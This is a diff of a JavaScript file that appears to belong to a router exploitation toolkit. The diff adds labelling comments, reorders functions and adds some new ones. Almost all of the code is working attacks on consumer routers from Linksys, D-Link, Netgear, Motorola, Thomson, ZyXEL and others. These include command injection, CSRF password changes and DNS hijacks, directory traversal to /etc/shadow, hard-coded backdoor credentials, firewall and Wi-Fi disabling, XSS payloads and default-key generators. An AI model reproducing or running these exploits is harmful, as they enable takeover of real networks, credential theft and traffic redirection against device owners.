@@ -76,7 +76,7 @@ function binatone_dt850w_changeadmin(ip)
 
 }
 
-
+// Sitecom WLR-4000/4004 routers default WPA generator
 function sitecom400xwpa(keylength) {
     "use strict";
 
@@ -372,6 +372,7 @@ function hg866passr() {
 		
 	}
 
+// Huawei HG866 Denial of service
 	function hg866dosr() {
 		ip=prompt("IP:");
 		document.hg866dos.action="http://"+ip+"/html/admin_reboot.html";
@@ -380,10 +381,32 @@ function hg866passr() {
 		}
 	}
 
+// ASUS RT-N16 - Text-plain Admin Password Disclosure
 function rtn16_passdisclosure(ip)
 {
     ip = ip || "192.168.1.1";
     document.location="http://"+ip+"/error_page.htm";
+}
+
+// Linksys X2000 - Remote Command Execution
+function x2000_command(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = prompt("Command:");
+	cmd = encodeURIComponent(cmd).replace(/%20/g, '%09'); // Encode and replace spaces with tabs
+
+	var form = '<input	type="hidden"	name="submit_button"	value="Diagnostics"/>\
+			    <input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
+			    <input	type="hidden"	name="submit_type"		value="start_ping"/>\
+			    <input	type="hidden"	name="action"			value=""/>\
+			    <input	type="hidden"	name="commit"			value="0"/>\
+			    <input	type="hidden"	name="nowait"			value="1"/>\
+			    <input	type="hidden"	name="ping_size"		value="32"/>\
+			    <input	type="hidden"	name="ping_times"		value="5"/>\
+			    <input	type="hidden"	name="ping_ip"			value="' + cmd + '"/>\
+			    </form>';
+
+	post('http://' + ip + '/setup.cgi', form);
 }
 
 // Cisco Linksys WAG200GB - Remote Command Execution
@@ -514,6 +537,7 @@ function wndr3400_disclosure(ip)
 	document.location="http://"+ip+url;
 }
 
+// D-Link DSL-2740B - Disable Wireless MAC Filter
 function dsl2740b_disablemacfilter(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -523,13 +547,15 @@ function dsl2740b_disablemacfilter(ip)
 	post('http://' + ip + '/wlmacflt.cmd', form);
 }
 
+// Netgear DGN1000B - Remote Command Execution
 function dgn1000b_commandexec(ip)
 {
-	ip = ip || "192.168.178.188";
+	ip = ip || "192.168.0.1";
 	cmd = prompt("Command:");
 	url = "/setup.cgi?UPnP=UPnP&AdverTime=30&TimeToLive=`%20" + encodeURI(cmd) + "%20`&save=+Anwenden&todo=save&this_file=upnp.htm&next_file=upnp.htm&h_UPnP=enable&hiddenAdverTime=30&hiddenTimeToLive=4";
 	document.location="http://"+ip+url;
 }
+
 // D-LINK DIR-280 - Change Admin Password
 function dir280_changepassword(ip)
 {
@@ -577,9 +603,10 @@ function td8840t_resetauth(ip)
     
 }
 
+// D-Link DSL-320B - Configuration Disclosure
 function dsl320b_configdisclosure(ip)
 {
-    ip = ip || "192.168.178.111";
+    ip = ip || "192.168.1.1";
     document.location="http://"+ip+"/config.bin";
 }
 
@@ -680,6 +707,7 @@ function dgn2200_opentelnet(ip)
 	post('http://' + ip + '/ping.cgi', form);
 }
 
+// Linksys WRT160nv2 - apply.cgi Remote Command Injection
 function wrt160nv2_command(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -697,11 +725,11 @@ function wrt160nv2_command(ip)
 	post('http://admin:admin@' + ip + '/apply.cgi', form);
 }
 
-// Linksys WRT110 Remote Command Execution
 function afterTwoSeconds() {    
     authWindow.close(); 
 }
 
+// Linksys WRT110 Remote Command Execution
 function wrt110_command(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -713,16 +741,14 @@ function wrt110_command(ip)
 	post('http://admin@admin@' + ip + '/ping.cgi', form);
 }
 
-
-
+// TP-Link WR1043ND - Change DNS CSRF
 function wr1043nd_dnscsrf(ip)
 {
 	ip = ip || "192.168.1.1";
 	dns_primary = prompt("DNS Primary:");
 	dns_secundary = prompt("DNS Secondary:");
 	var url = "/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=" + dns_primary + "+&dnsserver2=" + dns_secondary + "&Save=%B1%A3+%B4%E6";
-	document.location("http://" + ip + url); 
-
+	document.location("http://" + ip + url);
 }
 
 // Cisco EPC3925 - Change Admin Password CSRF
@@ -735,6 +761,7 @@ function epc3925_changepassword(ip)
 	post('http://' + ip + '/goform/Quick_setup', form);
 }
 
+// Cisco DPC/EPC3925 - Persistent Cross Site Scripting
 function epc3925_postxss(ip)
 {
     ip = ip || "192.168.0.1";
@@ -779,7 +806,7 @@ function x3000_addadmin(ip)
 	post('http://' + ip + '/apply.cgi', form);
 }
 
-
+// Freebox V6 Authentication Bypass Reboot
 function freeboxdosr() {
 	ip=prompt("IP:");
 	document.freeboxdos.action="http://"+ip+"/system.cgi";
@@ -795,6 +822,7 @@ function brightbox_configdisclosure(ip)
     document.location="http://"+ip+"/cgi/cgi_status.js";
 }
 
+// Huawei HG5XX remote ppp password disclosure
 function huapppr(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/Listadeparametros.html";
@@ -804,6 +832,7 @@ function huapppr(){
 	}
 }
 
+// Asus RT-N66U command execution
 function rtn66uexe(){
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -814,6 +843,7 @@ function rtn66uexe(){
 	}
 }
 
+// Asus RT-N56U RT-AC66U command execution
 function N56Uexe(){
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -824,12 +854,14 @@ function N56Uexe(){
 	}
 }
 
+// Huawei HG5XX remote ppp password disclosure
 function huappp(){
 	img1.src="http://192.168.1.254/Listadeparametros.html";
 	alert("Continue");
 	document.location="http://192.168.1.254/wanfun.js";
 }
 
+// 2 Wire 17x 18x 20x 27x 38x Add domain to hosts table CSRF
 function wireAddHosts() {
 	dominio=prompt("Redirect this host:");
 	ip=prompt("to this IP:");
@@ -837,7 +869,6 @@ function wireAddHosts() {
 		document.location="http://home/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
 	}
 }
-
 function wireAddHostsip() {
 	routerip=prompt("Router IP:");
 	dominio=prompt("Redirect this host:");
@@ -846,6 +877,8 @@ function wireAddHostsip() {
 		document.location="http://"+routerip+"/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
 	}
 }
+
+// 2 Wire 17x 18x 20x 27x CRLF denial of service remote MDC
 function wirecrlfr() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
@@ -859,6 +892,7 @@ function wirecrlf() {
 	}
 }
 
+// Siemens 5200 Default administrator account
 function ssDefaultPass() {
 	ip=prompt("Remote IP:");
 		if (ip==null || ip==""){}else{
@@ -866,6 +900,7 @@ function ssDefaultPass() {
 	}
 }
 
+// Thomson ST585 Redirect domain CSRF
 function thomsondom() {
 	dominio=prompt("Redirect this domain:");
 	document.thomsondom.dom1.value=dominio;
@@ -873,31 +908,6 @@ function thomsondom() {
 	document.thomsondom.dom2.value=dominio2;
 	if (dominio==null || dominio=="" || dominio2==null || dominio2==""){}else{
 		document.thomsondom.submit();
-	}
-}
-function thomsonadmin() {
-	admin=prompt("Add administrator user(password):");
-	document.thomsonadmin.elements[4].value=admin;
-	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
-	if (admin==null || admin==""){}else{
-		document.thomsonadmin.submit();
-	}
-}
-
-function thomsonadminr() {
-	ip=prompt("IP");
-	admin=prompt("Add administrator user(password):");
-	document.thomsonadmin.elements[4].value=admin;
-	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
-	if (ip==null || ip==""){}else{
-		document.thomsonadmin.submit();
-	}
-}
-function thomsoncall() {
-	num=prompt("Call this phone number:");
-	document.thomsoncall.elements[1].value=num;
-	if (num==null || num==""){}else{
-		document.thomsoncall.submit();
 	}
 }
 function thomsondomr() {
@@ -912,6 +922,33 @@ function thomsondomr() {
 	}
 }
 
+// Thomson ST585 Add administrator account CSRF
+function thomsonadmin() {
+	admin=prompt("Add administrator user(password):");
+	document.thomsonadmin.elements[4].value=admin;
+	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
+	if (admin==null || admin==""){}else{
+		document.thomsonadmin.submit();
+	}
+}
+function thomsonadminr() {
+	ip=prompt("IP");
+	admin=prompt("Add administrator user(password):");
+	document.thomsonadmin.elements[4].value=admin;
+	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
+	if (ip==null || ip==""){}else{
+		document.thomsonadmin.submit();
+	}
+}
+
+// Thomson bthomehub call number (voice-jacking) auth bypass
+function thomsoncall() {
+	num=prompt("Call this phone number:");
+	document.thomsoncall.elements[1].value=num;
+	if (num==null || num==""){}else{
+		document.thomsoncall.submit();
+	}
+}
 function thomsoncallr() {
 	ip=prompt("IP:");
 	num=prompt("Call this phone number:");
@@ -921,6 +958,8 @@ function thomsoncallr() {
 		document.thomsoncall.submit();
 	}
 }
+
+// Thomson bthomehub enable remote access and change tech password
 function btra() {
 	pass=prompt("Change tech password to:");
 	document.btra.elements[2].value=pass;
@@ -937,6 +976,8 @@ function btrar() {
 		document.btra.submit();
 	}
 }
+
+// Thomson bthomehub disable wifi
 function btwifir() {
 	ip=prompt("IP:");
 	document.btwifi.action="http://"+ip+"/cgi/b/_wli_/cfg//";
@@ -944,6 +985,8 @@ function btwifir() {
 		document.btwifi.submit();
 	}
 }
+
+// Huawei SmartAX MT880 add administrator account
 function mt880admin() {
 	admin=prompt("Add administrator user(password):");
 	if (admin==null || admin==""){}else{
@@ -958,11 +1001,13 @@ function mt880adminr() {
 	}
 }
 
+// Sitecom DC-227 Backdoor account
 function dc227backdoor() {
 	ip=prompt("IP:");
 	document.location="http://adsl:epicrouter2007@"+ip;
 }
 
+// D-Link DSL-2740B - Disable Firewall
 function dsl2740b_disablefirewall(ip)
 {
 	ip = ip || "192.168.1.1";
@@ -972,6 +1017,7 @@ function dsl2740b_disablefirewall(ip)
 	post('http://' + ip + '/scdmz.cmd', form);
 }
 
+// Huawei SmartAX MT880 disable firewall/anti-dos w/default pass
 function mt880fw() {
 	ip=prompt("IP:");
 	admin=prompt("Add administrator user(password):");
@@ -980,13 +1026,13 @@ function mt880fw() {
 	}
 }
 
+// Ubiquiti AirOS command execution
 function airoscmd() {
 	cmd=prompt("Command:");
 	if (cmd==null || cmd==""){}else{
 		document.location="http://192.168.1.1/stainfo.cgi?ifname=eth0;"+cmd;
 	}
 }
-
 function airoscmdr() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -995,7 +1041,7 @@ function airoscmdr() {
 	}
 }
 
-
+// 3com OfficeConnect command execution
 function comcommand() {
 	ip=prompt("IP:");
 	cmd=prompt("Command:");
@@ -1011,6 +1057,7 @@ function comcommandl() {
 	}
 }
 
+// Belkin F5D7632-4 6.01.04 change dns servers, F5D7230-4 change dns servers
 function belkindns() {
 	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
 	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
@@ -1028,7 +1075,6 @@ function belkindns() {
 		document.belkindns.submit();
 	}
 }
-
 function belkindnsr() {
 	ip=prompt("IP:");
 	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
@@ -1049,6 +1095,7 @@ function belkindnsr() {
 	}
 }
 
+// Belkin F5D7230-4 factory reset
 function belkinrest() {
 	ip=prompt("IP:");
 	document.belkinrest.action="http://"+ip+"/cgi-bin/setup_dns.exe";
@@ -1057,6 +1104,7 @@ function belkinrest() {
 	}
 }
 
+// Belkin F9K1002 Authentication Bypass
 function tF() {
 	ip=prompt("IP:");
 	document.tF.action="http://"+ip+"/cgi-bin/login.exe";
@@ -1065,6 +1113,7 @@ function tF() {
 	}
 }
 
+// Linksys WRT54G change admin password
 function wrtadmin() {
 	admin=prompt("Change administrator password:");
 	document.wrtadmin.http_passwd.value=admin;
@@ -1073,24 +1122,6 @@ function wrtadmin() {
 		document.wrtadmin.submit();
 	}
 }
-// TP-Link WDR740ND/WDR740N - Directory Traversal
-function wdr740_dirtraversal(ip)
-{
-
-	ip = ip || "192.168.1.254";
-	path = prompt("Path: (ex: /etc/shadow)");
-	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
-}
-
-// D-Link DIR-615 D3 - Remote Command Execution
-function d615d3_commandexec(ip)
-{
-	ip = ip || "192.168.178.155";
-	cmd = prompt("Command:");
-	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20` " + cmd + "` ";
-	document.location="http://"+ip+url;
-}
-
 function wrtadminr() {
 	ip=prompt("IP:");
 	document.wrtadmin.action="http://"+ip+"/manage.tri";
@@ -1101,6 +1132,25 @@ function wrtadminr() {
 		document.wrtadmin.submit();
 	}
 }
+
+// TP-Link WDR740ND/WDR740N - Directory Traversal
+function wdr740_dirtraversal(ip)
+{
+	ip = ip || "192.168.0.1";
+	path = prompt("Path: (ex: /etc/shadow)");
+	document.location = "http://" + ip + "/help/../../../../../../../../../../../../../../../.." + path;
+}
+
+// D-Link DIR-615 D3 - Remote Command Execution
+function d615d3_commandexec(ip)
+{
+	ip = ip || "192.168.0.1";
+	cmd = prompt("Command:");
+	url = "/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20` " + cmd + "` ";
+	document.location="http://"+ip+url;
+}
+
+// Linksys WAG120N Change admin password
 function wag120pass() {
 	admin=prompt("Change administrator password:");
 	document.wag120pass.sysPasswd.value=admin;
@@ -1109,6 +1159,18 @@ function wag120pass() {
 		document.wag120pass.submit();
 	}
 }
+function wag120passr() {
+	ip=prompt("IP:");
+	document.wag120pass.action="http://"+ip+"/setup.cgi";
+	admin=prompt("Change administrator password:");
+	document.wag120pass.sysPasswd.value=admin;
+	document.wag120pass.sysConfirmPasswd.value=admin;
+	if (ip==null || ip==""){}else{
+		document.wag120pass.submit();
+	}
+}
+
+// Sagem F@ST 2604 CSRF Change Admin Password
 function sagem2604() {
 	admin=prompt("Change administrator password:");
 	document.sagem2604.sysPasswd.value=admin;
@@ -1125,6 +1187,8 @@ function sagem2604r() {
 		document.sagem2604.submit();
 	}
 }
+
+// Linksys WAG120N Add admin user
 function wag120add() {
 	user=prompt("Add administrator username:");
 	document.wag120add.sysname.value=user;
@@ -1133,16 +1197,6 @@ function wag120add() {
 	document.wag120add.sysConfirmPasswd.value=admin;
 	if (user==null || user==""){}else{
 		document.wag120add.submit();
-	}
-}
-function wag120passr() {
-	ip=prompt("IP:");
-	document.wag120pass.action="http://"+ip+"/setup.cgi";
-	admin=prompt("Change administrator password:");
-	document.wag120pass.sysPasswd.value=admin;
-	document.wag120pass.sysConfirmPasswd.value=admin;
-	if (ip==null || ip==""){}else{
-		document.wag120pass.submit();
 	}
 }
 function wag120addr() {
@@ -1157,6 +1211,8 @@ function wag120addr() {
 		document.wag120add.submit();
 	}
 }
+
+// Linksys WRT54G enable remote interface
 function wrtradmin() { //fixed. thnx lightos
 	admin=prompt("Set administrator password:");
 	document.wrtadmin.http_passwd.value=admin;
@@ -1179,6 +1235,8 @@ function wrtradminr() {
 		document.wrtadmin.submit();
 	}
 }
+
+// Linksys WRT54G restore factory defaults
 function wrtdefault() {
 	ip=prompt("IP:");
 	document.wrtdefault.action="http://"+ip+"/factdefa.tri";
@@ -1186,6 +1244,8 @@ function wrtdefault() {
 		document.wrtdefault.submit();
 	}
 }
+
+// Linksys WRT54G disable wifi encription
 function wrtwifi() {
 	ip=prompt("IP:");
 	document.wrtwifi.action="http://"+ip+"/Security.tri";
@@ -1194,20 +1254,28 @@ function wrtwifi() {
 	}
 }
 
+// D-Link WBR-1310 Authentication Bypass set new password
 function wbrpass() {
 	admin=prompt("New password:");
 	if (admin==null || admin==""){}else{
 		document.location="http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
 	}
 }
+function wbrpassr() {
+	ip=prompt("IP:");
+	admin=prompt("New password:");
+	if (ip==null || ip==""){}else{
+		document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
+	}
+}
 
+// D-Link DIR-615 change password &amp; enable remote admin
 function dirpass() {
 	admin=prompt("New password:");
 	if (admin==null || admin==""){}else{
 		document.location="http://192.168.0.1/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
 	}
 }
-
 function dirpassr() {
 	ip=prompt("IP:");
 	admin=prompt("New password:");
@@ -1216,11 +1284,11 @@ function dirpassr() {
 	}
 }
 
+// D-Link DSL-500T reset password CSRF
 function dsltpass() {
 	alert("Reseting password admin:password");
 	document.dsltpass.submit();
 }
-
 function dsltpassr() {
 	ip=prompt("IP:");
 	alert("Reseting password admin:password");
@@ -1230,15 +1298,14 @@ function dsltpassr() {
 	}
 }
 
+// D-Link DSL-2640B change admin password CSRF
 function DSL2640B() {
-	ip=prompt("IP:");
 	pass=prompt("Password:");
 	document.dsl2640.action="http://192.168.1.1:80/redpass.cgi?sysPassword="+pass+"&change=1";
 	if (ip==null || ip==""){}else{
 		document.dsl2640.submit();
 	}
 }
-
 function DSL2640Br() {
 	ip=prompt("IP:");
 	pass=prompt("Password:");
@@ -1248,6 +1315,7 @@ function DSL2640Br() {
 	}
 }
 
+// D-Link DSL-2640U PPoE Data Disclosure (ADSL Router)
 function ff2640U(){
 	ip=prompt("IP:");
 	document.f2640U.action="http://"+ip+"/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0";
@@ -1256,7 +1324,8 @@ function ff2640U(){
 	}
 }
 
-function  ff1500WG(){
+// Not used
+function ff1500WG(){
 	ip=prompt("IP:");
 	document.f1500WG.action="http://"+ip+"/m_atminttemp11.stm";
 	if (ip==null || ip==""){}else{
@@ -1264,6 +1333,7 @@ function  ff1500WG(){
 	}
 }
 
+// Not used
 function singwiredosr() {
 	ip=prompt("IP:");
 	document.singwiredos.action="http://"+ip+"/xslt";
@@ -1272,19 +1342,15 @@ function singwiredosr() {
 	}
 }
 
-function wbrpassr() {
-	ip=prompt("IP:");
-	admin=prompt("New password:");
-	if (ip==null || ip==""){}else{
-		document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
-	}
-}
+// Huawei SmartAX MT880 default password
 function setipadminadmin() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://admin:admin@"+ip;
 	}
 }
+
+// ZyXEL Zywall2 Persistent Cross Site Scripting
 function zyxelxss() {
 	dom=prompt("Domain:");
 	document.zyxelxss.sysDomainname.value=dom;
@@ -1292,20 +1358,6 @@ function zyxelxss() {
 	document.zyxelxss.sysSystemname.value=xss;
 	if (dom==null || dom==""){}else{
 		document.zyxelxss.submit();
-	}
-}
-function zyxelxssp() {
-	xss=getxss();
-	document.zyxelxssp.PortRule_Name.value=xss;
-	if (xss==null || xss==""){}else{
-		document.zyxelxssp.submit();
-	}
-}
-function zyxelxsspr() {
-	xss=getxss();
-	document.zyxelxssp.PortRule_Name.value=xss;
-	if (xss==null || Xss==""){}else{
-		document.zyxelxssp.submit();
 	}
 }
 function zyxelxssr() {
@@ -1319,12 +1371,34 @@ function zyxelxssr() {
 		document.zyxelxss.submit();
 	}
 }
+
+// ZyXEL O2 Classic persistent cross site scripting
+function zyxelxssp() {
+	xss=getxss();
+	document.zyxelxssp.PortRule_Name.value=xss;
+	if (xss==null || xss==""){}else{
+		document.zyxelxssp.submit();
+	}
+}
+function zyxelxsspr() {
+	ip=prompt("IP:");
+	xss=getxss();
+	document.zyxelxssp.PortRule_Name.value=xss;
+	document.zyxelxssp.action="http://"+ip+"/Forms/PortForwarding_Edit_1";
+	if (xss==null || Xss==""){}else{
+		document.zyxelxssp.submit();
+	}
+}
+
+// ZyXEL Prestige default password
 function zyxeldefault() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://user:1234@"+ip;
 	}
 }
+
+// Not used
 function shodan() {
 	q=prompt("Search:");
 	if (q==null || q==""){}else{
@@ -1332,6 +1406,7 @@ function shodan() {
 	}
 }
 
+// Not used
 function macfind() {
 	q=prompt("AP MAC:");
 	if (q==null || q==""){}else{
@@ -1339,69 +1414,84 @@ function macfind() {
 	}
 }
 
+// Siemens FlexiISN auth bypass AAA Configuration
 function isnaaa(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/cgi-bin/aaa.tcl?";
 	}
 }
+
+// Siemens FlexiISN auth bypass Aggregation Class Configuration
 function isnagr(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/cgi-bin/aggr_config.tcl?";
 	}
 }
+
+// Siemens FlexiISN auth bypass GGSN general Configuration
 function isnggs(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/opt/cgi-bin/ggsn/cgi.tcl?page=ggsnconf";
 	}
 }
+
+// Siemens FlexiISN auth bypass Network Access &amp; services
 function isnser(){
 	ip=prompt("Flexi-ISN IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://"+ip+"/opt/cgi-bin/services.tcl?instance=default";
 	}
 }
+
+// Motorola SBG900 turn off firewall
 function motfirr(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/frames.asp?userId=admin&password=motorola";
 	alert("Continuar...");
 	img2.src="http://"+ip+"/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4";
 }
+function motfir(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	alert("Continue...");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
+}
+
+// Motorola SBG900 enable remote access
 function motremr(){
 	ip=prompt("IP:");
 	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
 	alert("Continuar...");
 	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
 }
+function motrem(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	alert("Continue...");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
+}
+
+// Motorola SBG900 disable DHCP &amp; add custom DNS server
 function motdnsr(){
 	ip=prompt("IP:");
 	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
 	dns=prompt("DNS:");
 	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+dns+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
 }
+function motdns(){
+	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
+	ip=prompt("DNS:");
+	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
+}
+
+// Motorola SBG900 change admin password
 function motpasr(){
 	ipp=prompt("IP:");
 	ip=prompt("New password:");
 	img1.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
 	alert("Continuar...");
 	img2.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
-}
-function motfir(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	alert("Continue...");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
-}
-function motrem(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	alert("Continue...");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
-}
-function motdns(){
-	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
-	ip=prompt("DNS:");
-	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
 }
 function motpas(){
 	ip=prompt("New password:");
@@ -1419,8 +1509,8 @@ function SBG6580_motorola(ip)
 	post('http://' + ip + '/goform/login', form);
 }
 
-
 function ruggedcom(){
+// RuggedCom "factory" Backdoor Password Generator
 // JC CREW April 23 2012 \n";
 // .js by hkm
   mac=prompt("MAC: ");
@@ -1468,6 +1558,7 @@ function acctongen(){
   }
   alert("PASSWORD: "+pass);
 }
+
 function mac2wepkey(){
 /* mac2wepkey Huawei HG520 by humberto121@websec.mx - 12/2010 */
 /* .js by hkm */
@@ -1543,25 +1634,30 @@ ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]
 
 alert("          WEP = "+key[ya]+key[yb]+key[yc]+key[yd]+key[ye]+"\n          SSID = "+ssid[s1]+ssid[s2]+ssid[s3]+ssid[s4]);
 }
+
 String.prototype.toHex = function() {
     return this.replace("com", function(s) {
         return "%"+parseInt(s.charCodeAt()).toString(16);
     });
 };
 
+// TRENDnet TEW 812DRU CSRF Enable remote telnet
 function trend23pwn(){
 document.t231.submit();
 setTimeout(function() {document.t232.submit();},3000);
 setTimeout(function() {document.t233.submit();},6000);
 }
 
-function netdos() {
-	ip=prompt("IP:");
+// Netgear DG632 'firmwarecfg' denial of service
+function netdos(ip) {
+	ip = ip || "192.168.0.1";
 	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
 	if (ip==null || ip==""){}else{
 		document.netdos.submit();
 	}
 }
+
+// Netgear WNAP210 authentication bypass
 function netbyp(){
 	ip=prompt("IP:");
 	img1.src="http://"+ip+"/recreate.php";
@@ -1571,18 +1667,23 @@ function netbyp(){
 	}
 }
 
+// Netgear WG602 undocumented admin account (super)
 function netund() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://super:5777364@"+ip;
 	}
 }
+
+// Netgear WG602 undocumented admin account (superman)
 function netundb() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://superman:21241036@"+ip;
 	}
 }
+
+// Netgear FVS318 content filtering bypass
 function netcon() {
 	url=prompt("Full URL (without http):");
 	dominio=url.substr(0,url.indexOf("/"));
@@ -1591,13 +1692,16 @@ function netcon() {
 		document.location="http://"+dominio+path.toHex();
 	}
 }
+
+// Netear RP614v4 config disclosure
 function netconb() {
 	ip=prompt("IP:");
-	port=prompt("Port:");
 	if (ip==null || ip==""){}else{
-		document.location="http://"+ip+"/vgn/jsp/netgear.cfg"+port;
+		document.location="http://"+ip+"/vgn/jsp/netgear.cfg";
 	}
 }
+
+// Netgear FVS318 log file arbitrary content injection
 function netlog() {
 	url=prompt("Blocked URL:");
 	code=prompt("Inject code:");
@@ -1623,6 +1727,7 @@ function ciscowlc_addadmin()
 
 }
 
+// Cisco Wireless Lan Controller WLC 7.2.110.0 - DOS
 function ciscowlc_dos()
 {
 	ip = prompt("IP: ")
